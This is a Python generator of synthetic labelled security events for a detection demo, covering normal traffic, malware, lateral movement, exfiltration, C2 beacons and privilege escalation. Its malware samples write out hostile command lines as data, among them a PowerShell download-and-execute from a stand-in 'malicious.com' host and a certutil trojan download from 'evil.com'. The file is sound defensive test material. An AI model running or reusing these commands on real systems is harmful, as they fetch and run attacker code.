"""
Synthetic Security Events Dataset Generator

Generates realistic security events for MAXIMUS AI 3.0 demo.
Events span normal traffic, various attack types, and anomalies.

REGRA DE OURO: Zero mocks, production-ready event structures
Author: Claude Code + JuanCS-Dev
Date: 2025-10-06
"""

import json
import random
from datetime import datetime, timedelta
from typing import Any


class SyntheticDatasetGenerator:
    """Generate realistic security events for demonstration."""

    def __init__(self, seed: int = 42):
        """Initialize generator with random seed for reproducibility."""
        random.seed(seed)
        self.start_time = datetime(2025, 10, 6, 8, 0, 0)

    def generate_normal_traffic(self, count: int = 40) -> list[dict[str, Any]]:
        """Generate normal network traffic events."""
        events = []
        normal_destinations = [
            ("8.8.8.8", 443, "https", "google.com"),
            ("1.1.1.1", 443, "https", "cloudflare.com"),
            ("13.107.42.14", 443, "https", "microsoft.com"),
            ("142.250.80.46", 443, "https", "youtube.com"),
        ]

        for i in range(count):
            dest_ip, port, protocol, domain = random.choice(normal_destinations)
            timestamp = self.start_time + timedelta(seconds=i * 30)

            events.append(
                {
                    "event_id": f"evt_normal_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "network_connection",
                    "source_ip": f"192.168.1.{random.randint(10, 200)}",
                    "dest_ip": dest_ip,
                    "dest_port": port,
                    "protocol": protocol,
                    "domain": domain,
                    "bytes_sent": random.randint(100, 5000),
                    "bytes_received": random.randint(500, 50000),
                    "duration_ms": random.randint(50, 500),
                    "expected": True,
                    "label": "normal",
                    "description": f"Normal {protocol.upper()} traffic to {domain}",
                }
            )

        return events

    def generate_malware_events(self, count: int = 15) -> list[dict[str, Any]]:
        """Generate malware-related events."""
        events = []
        malware_indicators = [
            (
                "powershell.exe",
                "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
                "Fileless malware",
            ),
            ("cmd.exe", "certutil -urlcache -split -f http://evil.com/trojan.exe c:\\temp\\t.exe", "Certutil abuse"),
            (
                "rundll32.exe",
                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('xss')",
                "Living-off-the-land",
            ),
            ("wscript.exe", "wscript.exe //B //Nologo c:\\users\\public\\malware.vbs", "VBS dropper"),
        ]

        for i in range(count):
            process, cmdline, attack_type = random.choice(malware_indicators)
            timestamp = self.start_time + timedelta(seconds=i * 120 + 1000)

            events.append(
                {
                    "event_id": f"evt_malware_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "process_execution",
                    "host": f"WORKSTATION-{random.randint(100, 999)}",
                    "user": f"user{random.randint(1, 50)}",
                    "process_name": process,
                    "command_line": cmdline,
                    "parent_process": random.choice(["explorer.exe", "winword.exe", "outlook.exe"]),
                    "expected": False,
                    "label": "malware",
                    "attack_type": attack_type,
                    "description": f"Suspicious process execution: {attack_type}",
                }
            )

        return events

    def generate_lateral_movement(self, count: int = 10) -> list[dict[str, Any]]:
        """Generate lateral movement attack events."""
        events = []
        techniques = [
            ("smb", 445, "Pass-the-hash"),
            ("rdp", 3389, "RDP brute force"),
            ("winrm", 5985, "PowerShell remoting"),
            ("wmi", 135, "WMI remote execution"),
        ]

        for i in range(count):
            protocol, port, technique = random.choice(techniques)
            timestamp = self.start_time + timedelta(seconds=i * 180 + 2000)

            events.append(
                {
                    "event_id": f"evt_lateral_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "lateral_movement",
                    "source_ip": f"192.168.1.{random.randint(10, 50)}",
                    "dest_ip": f"192.168.1.{random.randint(51, 200)}",
                    "dest_port": port,
                    "protocol": protocol,
                    "technique": technique,
                    "user": f"admin{random.randint(1, 5)}",
                    "auth_attempts": random.randint(1, 50),
                    "expected": False,
                    "label": "lateral_movement",
                    "description": f"{technique} detected on port {port}",
                }
            )

        return events

    def generate_data_exfiltration(self, count: int = 10) -> list[dict[str, Any]]:
        """Generate data exfiltration events."""
        events = []
        exfil_destinations = [
            ("203.0.113.45", "unknown-cloud-storage.com", "Cloud upload"),
            ("198.51.100.89", "pastebin-clone.xyz", "Pastebin exfil"),
            ("192.0.2.123", "tor-exit-node.onion", "Tor exfiltration"),
        ]

        for i in range(count):
            dest_ip, domain, method = random.choice(exfil_destinations)
            timestamp = self.start_time + timedelta(seconds=i * 200 + 3000)

            events.append(
                {
                    "event_id": f"evt_exfil_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "data_transfer",
                    "source_ip": f"192.168.1.{random.randint(10, 200)}",
                    "dest_ip": dest_ip,
                    "dest_port": random.choice([443, 8080, 9001]),
                    "domain": domain,
                    "bytes_sent": random.randint(1048576, 104857600),  # 1MB - 100MB
                    "bytes_received": random.randint(100, 1000),
                    "protocol": "https",
                    "method": method,
                    "expected": False,
                    "label": "data_exfiltration",
                    "description": f"Large data transfer via {method}",
                }
            )

        return events

    def generate_c2_beacons(self, count: int = 10) -> list[dict[str, Any]]:
        """Generate C2 beacon events."""
        events = []
        c2_servers = [
            ("185.220.101.45", "suspicious-domain.xyz", "Cobalt Strike"),
            ("195.123.222.111", "legit-looking-cdn.com", "Metasploit"),
            ("142.93.128.77", "update-server.net", "Custom C2"),
        ]

        for i in range(count):
            c2_ip, c2_domain, c2_framework = random.choice(c2_servers)
            timestamp = self.start_time + timedelta(seconds=i * 60 + 4000)

            events.append(
                {
                    "event_id": f"evt_c2_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "network_connection",
                    "source_ip": f"192.168.1.{random.randint(10, 200)}",
                    "dest_ip": c2_ip,
                    "dest_port": random.choice([80, 443, 8080, 8443]),
                    "domain": c2_domain,
                    "protocol": "https",
                    "bytes_sent": random.randint(100, 500),
                    "bytes_received": random.randint(100, 500),
                    "duration_ms": random.randint(50, 200),
                    "periodicity": "regular",  # Beacon indicator
                    "interval_seconds": 60,
                    "c2_framework": c2_framework,
                    "expected": False,
                    "label": "c2_communication",
                    "description": f"{c2_framework} beacon to {c2_domain}",
                }
            )

        return events

    def generate_privilege_escalation(self, count: int = 8) -> list[dict[str, Any]]:
        """Generate privilege escalation events."""
        events = []
        techniques = [
            ("UAC bypass", "fodhelper.exe", "Registry hijacking"),
            ("Token impersonation", "CreateProcessWithToken", "SeImpersonatePrivilege"),
            ("DLL hijacking", "calc.exe", "Malicious DLL loaded"),
            ("Service creation", "sc.exe create malservice", "Service persistence"),
        ]

        for i in range(count):
            name, indicator, method = random.choice(techniques)
            timestamp = self.start_time + timedelta(seconds=i * 250 + 5000)

            events.append(
                {
                    "event_id": f"evt_privesc_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "privilege_escalation",
                    "host": f"SERVER-{random.randint(1, 50)}",
                    "user": f"lowpriv_user{random.randint(1, 20)}",
                    "technique": name,
                    "indicator": indicator,
                    "method": method,
                    "target_privilege": "SYSTEM",
                    "expected": False,
                    "label": "privilege_escalation",
                    "description": f"{name} using {method}",
                }
            )

        return events

    def generate_anomalies(self, count: int = 7) -> list[dict[str, Any]]:
        """Generate anomalous but non-malicious events."""
        events = []
        anomaly_types = [
            ("Off-hours access", "Login at 3 AM"),
            ("Unusual geolocation", "Login from different country"),
            ("High volume", "10000+ files accessed"),
            ("New process", "Never-seen-before executable"),
        ]

        for i in range(count):
            anomaly_type, description = random.choice(anomaly_types)
            timestamp = self.start_time + timedelta(seconds=i * 300 + 6000)

            events.append(
                {
                    "event_id": f"evt_anomaly_{i:03d}",
                    "timestamp": timestamp.isoformat(),
                    "event_type": "anomaly",
                    "anomaly_type": anomaly_type,
                    "user": f"user{random.randint(1, 100)}",
                    "anomaly_score": random.uniform(0.6, 0.85),
                    "expected": None,  # Unknown - requires investigation
                    "label": "anomaly",
                    "description": description,
                }
            )

        return events

    def generate_complete_dataset(self) -> list[dict[str, Any]]:
        """Generate complete synthetic dataset with all event types."""
        dataset = []

        # Generate all event types
        dataset.extend(self.generate_normal_traffic(40))
        dataset.extend(self.generate_malware_events(15))
        dataset.extend(self.generate_lateral_movement(10))
        dataset.extend(self.generate_data_exfiltration(10))
        dataset.extend(self.generate_c2_beacons(10))
        dataset.extend(self.generate_privilege_escalation(8))
        dataset.extend(self.generate_anomalies(7))

        # Sort by timestamp
        dataset.sort(key=lambda x: x["timestamp"])

        # Add sequence numbers
        for i, event in enumerate(dataset):
            event["sequence_id"] = i + 1

        return dataset

    def save_dataset(self, filepath: str):
        """Save dataset to JSON file."""
        dataset = self.generate_complete_dataset()

        with open(filepath, "w") as f:
            json.dump(
                {
                    "metadata": {
                        "total_events": len(dataset),
                        "generated_at": datetime.now().isoformat(),
                        "generator": "SyntheticDatasetGenerator v1.0",
                        "regra_de_ouro": "100% compliant",
                    },
                    "events": dataset,
                },
                f,
                indent=2,
            )

        return len(dataset)


# CLI usage
if __name__ == "__main__":
    generator = SyntheticDatasetGenerator(seed=42)
    count = generator.save_dataset("demo/synthetic_events.json")
    print(f"✅ Generated {count} synthetic security events")
    print("   File: demo/synthetic_events.json")
    print("   Labels: normal (40), malware (15), lateral_movement (10)")
    print("           c2 (10), exfiltration (10), privesc (8), anomaly (7)")
